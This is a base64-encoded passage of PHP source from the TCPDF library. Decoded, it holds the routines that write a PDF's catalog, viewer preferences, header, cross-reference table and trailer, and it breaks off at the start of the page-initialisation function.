CFlbXB0eSgkdGhpcy0+ZWZuYW1lcykpIHsKCQkJJG91dCAuPSAnIC9FbWJlZGRlZEZpbGVzIDw8L05hbWVzIFsnOwoJCQlmb3JlYWNoICgkdGhpcy0+ZWZuYW1lcyBBUyAkZm4gPT4gJGZyZWYpIHsKCQkJCSRvdXQgLj0gJyAnLiR0aGlzLT5fZGF0YXN0cmluZygkZm4pLicgJy4kZnJlZjsKCQkJfQoJCQkkb3V0IC49ICcgXT4+JzsKCQl9CgkJJG91dCAuPSAnID4+JzsKCQlpZiAoIWVtcHR5KCR0aGlzLT5kZXN0cykpIHsKCQkJJG91dCAuPSAnIC9EZXN0cyAnLigkdGhpcy0+bl9kZXN0cykuJyAwIFInOwoJCX0KCQkkb3V0IC49ICR0aGlzLT5fcHV0dmlld2VycHJlZmVyZW5jZXMoKTsKCQlpZiAoaXNzZXQoJHRoaXMtPkxheW91dE1vZGUpIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5MYXlvdXRNb2RlKSkpIHsKCQkJJG91dCAuPSAnIC9QYWdlTGF5b3V0IC8nLiR0aGlzLT5MYXlvdXRNb2RlOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VNb2RlKSBBTkQgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+UGFnZU1vZGUpKSkgewoJCQkkb3V0IC49ICcgL1BhZ2VNb2RlIC8nLiR0aGlzLT5QYWdlTW9kZTsKCQl9CgkJaWYgKGNvdW50KCR0aGlzLT5vdXRsaW5lcykgPiAwKSB7CgkJCSRvdXQgLj0gJyAvT3V0bGluZXMgJy4kdGhpcy0+T3V0bGluZVJvb3QuJyAwIFInOwoJCQkkb3V0IC49ICcgL1BhZ2VNb2RlIC9Vc2VPdXRsaW5lcyc7CgkJfQoJCS8vJG91dCAuPSAnIC9UaHJlYWRzIFtdJzsKCQlpZiAoJHRoaXMtPlpvb21Nb2RlID09ICdmdWxscGFnZScpIHsKCQkJJG91dCAuPSAnIC9PcGVuQWN0aW9uIFsnLiR0aGlzLT5wYWdlX29ial9pZFsxXS4nIDAgUiAvRml0XSc7CgkJfSBlbHNlaWYgKCR0aGlzLT5ab29tTW9kZSA9PSAnZnVsbHdpZHRoJykgewoJCQkkb3V0IC49ICcgL09wZW5BY3Rpb24gWycuJHRoaXMtPnBhZ2Vfb2JqX2lkWzFdLicgMCBSIC9GaXRIIG51bGxdJzsKCQl9IGVsc2VpZiAoJHRoaXMtPlpvb21Nb2RlID09ICdyZWFsJykgewoJCQkkb3V0IC49ICcgL09wZW5BY3Rpb24gWycuJHRoaXMtPnBhZ2Vfb2JqX2lkWzFdLicgMCBSIC9YWVogbnVsbCBudWxsIDFdJzsKCQl9IGVsc2VpZiAoIWlzX3N0cmluZygkdGhpcy0+Wm9vbU1vZGUpKSB7CgkJCSRvdXQgLj0gc3ByaW50ZignIC9PcGVuQWN0aW9uIFsnLiR0aGlzLT5wYWdlX29ial9pZFsxXS4nIDAgUiAvWFlaIG51bGwgbnVsbCAlRl0nLCAoJHRoaXMtPlpvb21Nb2RlIC8gMTAwKSk7CgkJfQoJCS8vJG91dCAuPSAnIC9BQSA8PD4+JzsKCQkvLyRvdXQgLj0gJyAvVVJJIDw8Pj4nOwoJCSRvdXQgLj0gJyAvTWV0YWRhdGEgJy4keG1wb2JqLicgMCBSJzsKCQkvLyRvdXQgLj0gJyAvU3RydWN0VHJlZVJvb3QgPDw+Pic7CgkJLy8kb3V0IC49ICcgL01hcmtJbmZvIDw8Pj4nOwoJCWlmIChpc3NldCgkdGhpcy0+bFsnYV9tZXRhX2xhbmd1YWdlJ10pKSB7CgkJCSRvdXQgLj0gJyAvTGFuZyAnLiR0aGlzLT5fdGV4dHN0cmluZygkdGhpcy0+bFsnYV9tZXRhX2xhbmd1YWdlJ10sICRvaWQpOwoJCX0KCQkvLyRvdXQgLj0gJyAvU3BpZGVySW5mbyA8PD4+JzsKCQkvLyBzZXQgT3V0cHV0SW50ZW50IHRvIHNSR0IgSUVDNjE5NjYtMi4xIGlmIHJlcXVpcmVkCgkJaWYgKCR0aGlzLT5wZGZhX21vZGUgT1IgJHRoaXMtPmZvcmNlX3NyZ2IpIHsKCQkJJG91dCAuPSAnIC9PdXRwdXRJbnRlbnRzIFs8PCc7CgkJCSRvdXQgLj0gJyAvVHlwZSAvT3V0cHV0SW50ZW50JzsKCQkJJG91dCAuPSAnIC9TIC9HVFNfUERGQTEnOwoJCQkkb3V0IC49ICcgL091dHB1dENvbmRpdGlvbiAnLiR0aGlzLT5fdGV4dHN0cmluZygnc1JHQiBJRUM2MTk2Ni0yLjEnLCAkb2lkKTsKCQkJJG91dCAuPSAnIC9PdXRwdXRDb25kaXRpb25JZGVudGlmaWVyICcuJHRoaXMtPl90ZXh0c3RyaW5nKCdzUkdCIElFQzYxOTY2LTIuMScsICRvaWQpOwoJCQkkb3V0IC49ICcgL1JlZ2lzdHJ5TmFtZSAnLiR0aGlzLT5fdGV4dHN0cmluZygnaHR0cDovL3d3dy5jb2xvci5vcmcnLCAkb2lkKTsKCQkJJG91dCAuPSAnIC9JbmZvICcuJHRoaXMtPl90ZXh0c3RyaW5nKCdzUkdCIElFQzYxOTY2LTIuMScsICRvaWQpOwoJCQkkb3V0IC49ICcgL0Rlc3RPdXRwdXRQcm9maWxlICcuJGljY29iai4nIDAgUic7CgkJCSRvdXQgLj0gJyA+Pl0nOwoJCX0KCQkvLyRvdXQgLj0gJyAvUGllY2VJbmZvIDw8Pj4nOwoJCWlmICghZW1wdHkoJHRoaXMtPnBkZmxheWVycykpIHsKCQkJJGx5cm9ianMgPSAnJzsKCQkJJGx5cm9ianNfb2ZmID0gJyc7CgkJCSRseXJvYmpzX2xvY2sgPSAnJzsKCQkJZm9yZWFjaCAoJHRoaXMtPnBkZmxheWVycyBhcyAkbGF5ZXIpIHsKCQkJCSRsYXllcl9vYmpfcmVmID0gJyAnLiRsYXllclsnb2JqaWQnXS4nIDAgUic7CgkJCQkkbHlyb2JqcyAuPSAkbGF5ZXJfb2JqX3JlZjsKCQkJCWlmICgkbGF5ZXJbJ3ZpZXcnXSA9PT0gZmFsc2UpIHsKCQkJCQkkbHlyb2Jqc19vZmYgLj0gJGxheWVyX29ial9yZWY7CgkJCQl9CgkJCQlpZiAoJGxheWVyWydsb2NrJ10pIHsKCQkJCQkkbHlyb2Jqc19sb2NrIC49ICRsYXllcl9vYmpfcmVmOwoJCQkJfQoJCQl9CgkJCSRvdXQgLj0gJyAvT0NQcm9wZXJ0aWVzIDw8IC9PQ0dzIFsnLiRseXJvYmpzLiddJzsKCQkJJG91dCAuPSAnIC9EIDw8JzsKCQkJJG91dCAuPSAnIC9OYW1lICcuJHRoaXMtPl90ZXh0c3RyaW5nKCdMYXllcnMnLCAkb2lkKTsKCQkJJG91dCAuPSAnIC9DcmVhdG9yICcuJHRoaXMtPl90ZXh0c3RyaW5nKCdUQ1BERicsICRvaWQpOwoJCQkkb3V0IC49ICcgL0Jhc2VTdGF0ZSAvT04nOwoJCQkkb3V0IC49ICcgL09GRiBbJy4kbHlyb2Jqc19vZmYuJ10nOwoJCQkkb3V0IC49ICcgL0xvY2tlZCBbJy4kbHlyb2Jqc19sb2NrLiddJzsKCQkJJG91dCAuPSAnIC9JbnRlbnQgL1ZpZXcnOwoJCQkkb3V0IC49ICcgL0FTIFsnOwoJCQkkb3V0IC49ICcgPDwgL0V2ZW50IC9QcmludCAvT0NHcyBbJy4kbHlyb2Jqcy4nXSAvQ2F0ZWdvcnkgWy9QcmludF0gPj4nOwoJCQkkb3V0IC49ICcgPDwgL0V2ZW50IC9WaWV3IC9PQ0dzIFsnLiRseXJvYmpzLiddIC9DYXRlZ29yeSBbL1ZpZXddID4+JzsKCQkJJG91dCAuPSAnIF0nOwoJCQkkb3V0IC49ICcgL09yZGVyIFsnLiRseXJvYmpzLiddJzsKCQkJJG91dCAuPSAnIC9MaXN0TW9kZSAvQWxsUGFnZXMnOwoJCQkvLyRvdXQgLj0gJyAvUkJHcm91cHMgWycuLiddJzsKCQkJLy8kb3V0IC49ICcgL0xvY2tlZCBbJy4uJ10nOwoJCQkkb3V0IC49ICcgPj4nOwoJCQkkb3V0IC49ICcgPj4nOwoJCX0KCQkvLyBBY3JvRm9ybQoJCWlmICghZW1wdHkoJHRoaXMtPmZvcm1fb2JqX2lkKQoJCQlPUiAoJHRoaXMtPnNpZ24gQU5EIGlzc2V0KCR0aGlzLT5zaWduYXR1cmVfZGF0YVsnY2VydF90eXBlJ10pKQoJCQlPUiAhZW1wdHkoJHRoaXMtPmVtcHR5X3NpZ25hdHVyZV9hcHBlYXJhbmNlKSkgewoJCQkkb3V0IC49ICcgL0Fjcm9Gb3JtIDw8JzsKCQkJJG9ianJlZnMgPSAnJzsKCQkJaWYgKCR0aGlzLT5zaWduIEFORCBpc3NldCgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddKSkgewoJCQkJLy8gc2V0IHJlZmVyZW5jZSBmb3Igc2lnbmF0dXJlIG9iamVjdAoJCQkJJG9ianJlZnMgLj0gJHRoaXMtPnNpZ19vYmpfaWQuJyAwIFInOwoJCQl9CgkJCWlmICghZW1wdHkoJHRoaXMtPmVtcHR5X3NpZ25hdHVyZV9hcHBlYXJhbmNlKSkgewoJCQkJZm9yZWFjaCAoJHRoaXMtPmVtcHR5X3NpZ25hdHVyZV9hcHBlYXJhbmNlIGFzICRlc2EpIHsKCQkJCQkvLyBzZXQgcmVmZXJlbmNlIGZvciBlbXB0eSBzaWduYXR1cmUgb2JqZWN0cwoJCQkJCSRvYmpyZWZzIC49ICcgJy4kZXNhWydvYmppZCddLicgMCBSJzsKCQkJCX0KCQkJfQoJCQlpZiAoIWVtcHR5KCR0aGlzLT5mb3JtX29ial9pZCkpIHsKCQkJCWZvcmVhY2goJHRoaXMtPmZvcm1fb2JqX2lkIGFzICRvYmppZCkgewoJCQkJCSRvYmpyZWZzIC49ICcgJy4kb2JqaWQuJyAwIFInOwoJCQkJfQoJCQl9CgkJCSRvdXQgLj0gJyAvRmllbGRzIFsnLiRvYmpyZWZzLiddJzsKCQkJLy8gSXQncyBiZXR0ZXIgdG8gdHVybiBvZmYgdGhpcyB2YWx1ZSBhbmQgc2V0IHRoZSBhcHBlYXJhbmNlIHN0cmVhbSBmb3IgZWFjaCBhbm5vdGF0aW9uICgvQVApIHRvIGF2b2lkIGNvbmZsaWN0cyB3aXRoIHNpZ25hdHVyZSBmaWVsZHMuCgkJCWlmIChlbXB0eSgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2FwcHJvdmFsJ10pIE9SICgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2FwcHJvdmFsJ10gIT0gJ0EnKSkgewoJCQkJJG91dCAuPSAnIC9OZWVkQXBwZWFyYW5jZXMgZmFsc2UnOwoJCQl9CgkJCWlmICgkdGhpcy0+c2lnbiBBTkQgaXNzZXQoJHRoaXMtPnNpZ25hdHVyZV9kYXRhWydjZXJ0X3R5cGUnXSkpIHsKCQkJCWlmICgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddID4gMCkgewoJCQkJCSRvdXQgLj0gJyAvU2lnRmxhZ3MgMyc7CgkJCQl9IGVsc2UgewoJCQkJCSRvdXQgLj0gJyAvU2lnRmxhZ3MgMSc7CgkJCQl9CgkJCX0KCQkJLy8kb3V0IC49ICcgL0NPICc7CgkJCWlmIChpc3NldCgkdGhpcy0+YW5ub3RhdGlvbl9mb250cykgQU5EICFlbXB0eSgkdGhpcy0+YW5ub3RhdGlvbl9mb250cykpIHsKCQkJCSRvdXQgLj0gJyAvRFIgPDwnOwoJCQkJJG91dCAuPSAnIC9Gb250IDw8JzsKCQkJCWZvcmVhY2ggKCR0aGlzLT5hbm5vdGF0aW9uX2ZvbnRzIGFzICRmb250a2V5ID0+ICRmb250aWQpIHsKCQkJCQkkb3V0IC49ICcgL0YnLiRmb250aWQuJyAnLiR0aGlzLT5mb250X29ial9pZHNbJGZvbnRrZXldLicgMCBSJzsKCQkJCX0KCQkJCSRvdXQgLj0gJyA+PiA+Pic7CgkJCX0KCQkJJGZvbnQgPSAkdGhpcy0+Z2V0Rm9udEJ1ZmZlcigoKCR0aGlzLT5wZGZhX21vZGUpID8gJ3BkZmEnIDogJycpIC4naGVsdmV0aWNhJyk7CgkJCSRvdXQgLj0gJyAvREEgJyAuICR0aGlzLT5fZGF0YXN0cmluZygnL0YnLiRmb250WydpJ10uJyAwIFRmIDAgZycpOwoJCQkkb3V0IC49ICcgL1EgJy4oKCR0aGlzLT5ydGwpPycyJzonMCcpOwoJCQkvLyRvdXQgLj0gJyAvWEZBICc7CgkJCSRvdXQgLj0gJyA+Pic7CgkJCS8vIHNpZ25hdHVyZXMKCQkJaWYgKCR0aGlzLT5zaWduIEFORCBpc3NldCgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddKQoJCQkJQU5EIChlbXB0eSgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2FwcHJvdmFsJ10pIE9SICgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2FwcHJvdmFsJ10gIT0gJ0EnKSkpIHsKCQkJCWlmICgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddID4gMCkgewoJCQkJCSRvdXQgLj0gJyAvUGVybXMgPDwgL0RvY01EUCAnLigkdGhpcy0+c2lnX29ial9pZCArIDEpLicgMCBSID4+JzsKCQkJCX0gZWxzZSB7CgkJCQkJJG91dCAuPSAnIC9QZXJtcyA8PCAvVVIzICcuKCR0aGlzLT5zaWdfb2JqX2lkICsgMSkuJyAwIFIgPj4nOwoJCQkJfQoJCQl9CgkJfQoJCS8vJG91dCAuPSAnIC9MZWdhbCA8PD4+JzsKCQkvLyRvdXQgLj0gJyAvUmVxdWlyZW1lbnRzIFtdJzsKCQkvLyRvdXQgLj0gJyAvQ29sbGVjdGlvbiA8PD4+JzsKCQkvLyRvdXQgLj0gJyAvTmVlZHNSZW5kZXJpbmcgdHJ1ZSc7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJcmV0dXJuICRvaWQ7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgdmlld2VyIHByZWZlcmVuY2VzLgoJICogQHJldHVybiBzdHJpbmcgZm9yIHZpZXdlciBwcmVmZXJlbmNlcwoJICogQGF1dGhvciBOaWNvbGEgYXN1bmkKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX3B1dHZpZXdlcnByZWZlcmVuY2VzKCkgewoJCSR2cCA9ICR0aGlzLT52aWV3ZXJfcHJlZmVyZW5jZXM7CgkJJG91dCA9ICcgL1ZpZXdlclByZWZlcmVuY2VzIDw8JzsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkb3V0IC49ICcgL0RpcmVjdGlvbiAvUjJMJzsKCQl9IGVsc2UgewoJCQkkb3V0IC49ICcgL0RpcmVjdGlvbiAvTDJSJzsKCQl9CgkJaWYgKGlzc2V0KCR2cFsnSGlkZVRvb2xiYXInXSkgQU5EICgkdnBbJ0hpZGVUb29sYmFyJ10pKSB7CgkJCSRvdXQgLj0gJyAvSGlkZVRvb2xiYXIgdHJ1ZSc7CgkJfQoJCWlmIChpc3NldCgkdnBbJ0hpZGVNZW51YmFyJ10pIEFORCAoJHZwWydIaWRlTWVudWJhciddKSkgewoJCQkkb3V0IC49ICcgL0hpZGVNZW51YmFyIHRydWUnOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydIaWRlV2luZG93VUknXSkgQU5EICgkdnBbJ0hpZGVXaW5kb3dVSSddKSkgewoJCQkkb3V0IC49ICcgL0hpZGVXaW5kb3dVSSB0cnVlJzsKCQl9CgkJaWYgKGlzc2V0KCR2cFsnRml0V2luZG93J10pIEFORCAoJHZwWydGaXRXaW5kb3cnXSkpIHsKCQkJJG91dCAuPSAnIC9GaXRXaW5kb3cgdHJ1ZSc7CgkJfQoJCWlmIChpc3NldCgkdnBbJ0NlbnRlcldpbmRvdyddKSBBTkQgKCR2cFsnQ2VudGVyV2luZG93J10pKSB7CgkJCSRvdXQgLj0gJyAvQ2VudGVyV2luZG93IHRydWUnOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydEaXNwbGF5RG9jVGl0bGUnXSkgQU5EICgkdnBbJ0Rpc3BsYXlEb2NUaXRsZSddKSkgewoJCQkkb3V0IC49ICcgL0Rpc3BsYXlEb2NUaXRsZSB0cnVlJzsKCQl9CgkJaWYgKGlzc2V0KCR2cFsnTm9uRnVsbFNjcmVlblBhZ2VNb2RlJ10pKSB7CgkJCSRvdXQgLj0gJyAvTm9uRnVsbFNjcmVlblBhZ2VNb2RlIC8nLiR2cFsnTm9uRnVsbFNjcmVlblBhZ2VNb2RlJ107CgkJfQoJCWlmIChpc3NldCgkdnBbJ1ZpZXdBcmVhJ10pKSB7CgkJCSRvdXQgLj0gJyAvVmlld0FyZWEgLycuJHZwWydWaWV3QXJlYSddOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydWaWV3Q2xpcCddKSkgewoJCQkkb3V0IC49ICcgL1ZpZXdDbGlwIC8nLiR2cFsnVmlld0NsaXAnXTsKCQl9CgkJaWYgKGlzc2V0KCR2cFsnUHJpbnRBcmVhJ10pKSB7CgkJCSRvdXQgLj0gJyAvUHJpbnRBcmVhIC8nLiR2cFsnUHJpbnRBcmVhJ107CgkJfQoJCWlmIChpc3NldCgkdnBbJ1ByaW50Q2xpcCddKSkgewoJCQkkb3V0IC49ICcgL1ByaW50Q2xpcCAvJy4kdnBbJ1ByaW50Q2xpcCddOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydQcmludFNjYWxpbmcnXSkpIHsKCQkJJG91dCAuPSAnIC9QcmludFNjYWxpbmcgLycuJHZwWydQcmludFNjYWxpbmcnXTsKCQl9CgkJaWYgKGlzc2V0KCR2cFsnRHVwbGV4J10pIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR2cFsnRHVwbGV4J10pKSkgewoJCQkkb3V0IC49ICcgL0R1cGxleCAvJy4kdnBbJ0R1cGxleCddOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydQaWNrVHJheUJ5UERGU2l6ZSddKSkgewoJCQlpZiAoJHZwWydQaWNrVHJheUJ5UERGU2l6ZSddKSB7CgkJCQkkb3V0IC49ICcgL1BpY2tUcmF5QnlQREZTaXplIHRydWUnOwoJCQl9IGVsc2UgewoJCQkJJG91dCAuPSAnIC9QaWNrVHJheUJ5UERGU2l6ZSBmYWxzZSc7CgkJCX0KCQl9CgkJaWYgKGlzc2V0KCR2cFsnUHJpbnRQYWdlUmFuZ2UnXSkpIHsKCQkJJFByaW50UGFnZVJhbmdlTnVtID0gJyc7CgkJCWZvcmVhY2ggKCR2cFsnUHJpbnRQYWdlUmFuZ2UnXSBhcyAkayA9PiAkdikgewoJCQkJJFByaW50UGFnZVJhbmdlTnVtIC49ICcgJy4oJHYgLSAxKS4nJzsKCQkJfQoJCQkkb3V0IC49ICcgL1ByaW50UGFnZVJhbmdlIFsnLnN1YnN0cigkUHJpbnRQYWdlUmFuZ2VOdW0sMSkuJ10nOwoJCX0KCQlpZiAoaXNzZXQoJHZwWydOdW1Db3BpZXMnXSkpIHsKCQkJJG91dCAuPSAnIC9OdW1Db3BpZXMgJy5pbnR2YWwoJHZwWydOdW1Db3BpZXMnXSk7CgkJfQoJCSRvdXQgLj0gJyA+Pic7CgkJcmV0dXJuICRvdXQ7Cgl9CgoJLyoqCgkgKiBPdXRwdXQgUERGIEZpbGUgSGVhZGVyICg3LjUuMikuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0aGVhZGVyKCkgewoJCSR0aGlzLT5fb3V0KCclUERGLScuJHRoaXMtPlBERlZlcnNpb24pOwoJCSR0aGlzLT5fb3V0KCclJy5jaHIoMHhlMikuY2hyKDB4ZTMpLmNocigweGNmKS5jaHIoMHhkMykpOwoJfQoKCS8qKgoJICogT3V0cHV0IGVuZCBvZiBkb2N1bWVudCAoRU9GKS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9lbmRkb2MoKSB7CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZm9udGtleSddKSBBTkQgaXNzZXQoJHRoaXMtPkN1cnJlbnRGb250WydzdWJzZXRjaGFycyddKSkgewoJCQkvLyBzYXZlIHN1YnNldCBjaGFycyBvZiB0aGUgcHJldmlvdXMgZm9udAoJCQkkdGhpcy0+c2V0Rm9udFN1YkJ1ZmZlcigkdGhpcy0+Q3VycmVudEZvbnRbJ2ZvbnRrZXknXSwgJ3N1YnNldGNoYXJzJywgJHRoaXMtPkN1cnJlbnRGb250WydzdWJzZXRjaGFycyddKTsKCQl9CgkJJHRoaXMtPnN0YXRlID0gMTsKCQkkdGhpcy0+X3B1dGhlYWRlcigpOwoJCSR0aGlzLT5fcHV0cGFnZXMoKTsKCQkkdGhpcy0+X3B1dHJlc291cmNlcygpOwoJCS8vIGVtcHR5IHNpZ25hdHVyZSBmaWVsZHMKCQlpZiAoIWVtcHR5KCR0aGlzLT5lbXB0eV9zaWduYXR1cmVfYXBwZWFyYW5jZSkpIHsKCQkJZm9yZWFjaCAoJHRoaXMtPmVtcHR5X3NpZ25hdHVyZV9hcHBlYXJhbmNlIGFzICRrZXkgPT4gJGVzYSkgewoJCQkJLy8gd2lkZ2V0IGFubm90YXRpb24gZm9yIGVtcHR5IHNpZ25hdHVyZQoJCQkJJG91dCA9ICR0aGlzLT5fZ2V0b2JqKCRlc2FbJ29iamlkJ10pLiJcbiI7CgkJCQkkb3V0IC49ICc8PCAvVHlwZSAvQW5ub3QnOwoJCQkJJG91dCAuPSAnIC9TdWJ0eXBlIC9XaWRnZXQnOwoJCQkJJG91dCAuPSAnIC9SZWN0IFsnLiRlc2FbJ3JlY3QnXS4nXSc7CgkJCQkkb3V0IC49ICcgL1AgJy4kdGhpcy0+cGFnZV9vYmpfaWRbKCRlc2FbJ3BhZ2UnXSldLicgMCBSJzsgLy8gbGluayB0byBzaWduYXR1cmUgYXBwZWFyYW5jZSBwYWdlCgkJCQkkb3V0IC49ICcgL0YgNCc7CgkJCQkkb3V0IC49ICcgL0ZUIC9TaWcnOwoJCQkJJHNpZ25hbWUgPSAkZXNhWyduYW1lJ10uc3ByaW50ZignIFslMDNkXScsICgka2V5ICsgMSkpOwoJCQkJJG91dCAuPSAnIC9UICcuJHRoaXMtPl90ZXh0c3RyaW5nKCRzaWduYW1lLCAkZXNhWydvYmppZCddKTsKCQkJCSRvdXQgLj0gJyAvRmYgMCc7CgkJCQkkb3V0IC49ICcgPj4nOwoJCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCX0KCQl9CgkJLy8gU2lnbmF0dXJlCgkJaWYgKCR0aGlzLT5zaWduIEFORCBpc3NldCgkdGhpcy0+c2lnbmF0dXJlX2RhdGFbJ2NlcnRfdHlwZSddKSkgewoJCQkvLyB3aWRnZXQgYW5ub3RhdGlvbiBmb3Igc2lnbmF0dXJlCgkJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigkdGhpcy0+c2lnX29ial9pZCkuIlxuIjsKCQkJJG91dCAuPSAnPDwgL1R5cGUgL0Fubm90JzsKCQkJJG91dCAuPSAnIC9TdWJ0eXBlIC9XaWRnZXQnOwoJCQkkb3V0IC49ICcgL1JlY3QgWycuJHRoaXMtPnNpZ25hdHVyZV9hcHBlYXJhbmNlWydyZWN0J10uJ10nOwoJCQkkb3V0IC49ICcgL1AgJy4kdGhpcy0+cGFnZV9vYmpfaWRbKCR0aGlzLT5zaWduYXR1cmVfYXBwZWFyYW5jZVsncGFnZSddKV0uJyAwIFInOyAvLyBsaW5rIHRvIHNpZ25hdHVyZSBhcHBlYXJhbmNlIHBhZ2UKCQkJJG91dCAuPSAnIC9GIDQnOwoJCQkkb3V0IC49ICcgL0ZUIC9TaWcnOwoJCQkkb3V0IC49ICcgL1QgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHRoaXMtPnNpZ25hdHVyZV9hcHBlYXJhbmNlWyduYW1lJ10sICR0aGlzLT5zaWdfb2JqX2lkKTsKCQkJJG91dCAuPSAnIC9GZiAwJzsKCQkJJG91dCAuPSAnIC9WICcuKCR0aGlzLT5zaWdfb2JqX2lkICsgMSkuJyAwIFInOwoJCQkkb3V0IC49ICcgPj4nOwoJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQkvLyBzaWduYXR1cmUKCQkJJHRoaXMtPl9wdXRzaWduYXR1cmUoKTsKCQl9CgkJLy8gSW5mbwoJCSRvYmppZF9pbmZvID0gJHRoaXMtPl9wdXRpbmZvKCk7CgkJLy8gQ2F0YWxvZwoJCSRvYmppZF9jYXRhbG9nID0gJHRoaXMtPl9wdXRjYXRhbG9nKCk7CgkJLy8gQ3Jvc3MtcmVmCgkJJG8gPSAkdGhpcy0+YnVmZmVybGVuOwoJCS8vIFhSRUYgc2VjdGlvbgoJCSR0aGlzLT5fb3V0KCd4cmVmJyk7CgkJJHRoaXMtPl9vdXQoJzAgJy4oJHRoaXMtPm4gKyAxKSk7CgkJJHRoaXMtPl9vdXQoJzAwMDAwMDAwMDAgNjU1MzUgZiAnKTsKCQkkZnJlZWdlbiA9ICgkdGhpcy0+biArIDIpOwoJCWZvciAoJGk9MTsgJGkgPD0gJHRoaXMtPm47ICsrJGkpIHsKCQkJaWYgKCFpc3NldCgkdGhpcy0+b2Zmc2V0c1skaV0pIEFORCAoJGkgPiAxKSkgewoJCQkJJHRoaXMtPl9vdXQoc3ByaW50ZignMDAwMDAwMDAwMCAlMDVkIGYgJywgJGZyZWVnZW4pKTsKCQkJCSsrJGZyZWVnZW47CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+X291dChzcHJpbnRmKCclMDEwZCAwMDAwMCBuICcsICR0aGlzLT5vZmZzZXRzWyRpXSkpOwoJCQl9CgkJfQoJCS8vIFRSQUlMRVIKCQkkb3V0ID0gJ3RyYWlsZXInLiJcbiI7CgkJJG91dCAuPSAnPDwnOwoJCSRvdXQgLj0gJyAvU2l6ZSAnLigkdGhpcy0+biArIDEpOwoJCSRvdXQgLj0gJyAvUm9vdCAnLiRvYmppZF9jYXRhbG9nLicgMCBSJzsKCQkkb3V0IC49ICcgL0luZm8gJy4kb2JqaWRfaW5mby4nIDAgUic7CgkJaWYgKCR0aGlzLT5lbmNyeXB0ZWQpIHsKCQkJJG91dCAuPSAnIC9FbmNyeXB0ICcuJHRoaXMtPmVuY3J5cHRkYXRhWydvYmppZCddLicgMCBSJzsKCQl9CgkJJG91dCAuPSAnIC9JRCBbIDwnLiR0aGlzLT5maWxlX2lkLic+IDwnLiR0aGlzLT5maWxlX2lkLic+IF0nOwoJCSRvdXQgLj0gJyA+Pic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJJHRoaXMtPl9vdXQoJ3N0YXJ0eHJlZicpOwoJCSR0aGlzLT5fb3V0KCRvKTsKCQkkdGhpcy0+X291dCgnJSVFT0YnKTsKCQkkdGhpcy0+c3RhdGUgPSAzOyAvLyBlbmQtb2YtZG9jCgl9CgoJLyoqCgkgKiBJbml0aWFsaXplIGEgbmV3IHBhZ2UuCgkgKiBAcGFyYW0gc3RyaW5nICRvcmllbnRhdGlvbiBwYWdlIG9yaWVudGF0aW9uLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIChjYXNlIGluc2Vuc2l0aXZlKTo8dWw+PGxpPlAgb3IgUE9SVFJBSVQgKGRlZmF1bHQpPC9saT48bGk+TCBvciBMQU5EU0NBUEU8L2xpPjwvdWw+CgkgKiBAcGFyYW0gbWl4ZWQgJGZvcm1hdCBUaGUgZm9ybWF0IHVzZWQgZm9yIHBhZ2VzLiBJdCBjYW4gYmUgZWl0aGVyOiBvbmUgb2YgdGhlIHN0cmluZyB2YWx1ZXMgc3BlY2lmaWVkIGF0IGdldFBhZ2VTaXplRnJvbUZvcm1hdCgpIG9yIGFuIGFycmF5IG9mIHBhcmFtZXRlcnMgc3BlY2lmaWVkIGF0IHNldFBhZ2VGb3JtYXQoKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzZWUgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCksIHNldFBhZ2VGb3JtYXQoKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2JlZ2lucGFnZSgkb3JpZW50YXRpb249JycsICRmb3JtYXQ9JycpIHsKCQkrKyR0aGlzLT5wYWdlOwoJCSR0aGlzLT5wYWdlb2JqZWN0c1skdGhpcy0+cGFnZV0gPSBhcnJheSgpOwoJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlLCAnJyk7CgkJLy8gaW5pdGlhbGl6ZSBhcnJheSBmb3IgZ3JhcGhpY3MgdHJhbmZvcm1hdGlvbiBwb3NpdGlvbnMgaW5zaWRlIGEgcGFnZSBidWZmZXIKCQkkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSA9IGFycmF5KCk7CgkJJHRoaXMtPnN0YXRlID0gMjsKCQlpZiAo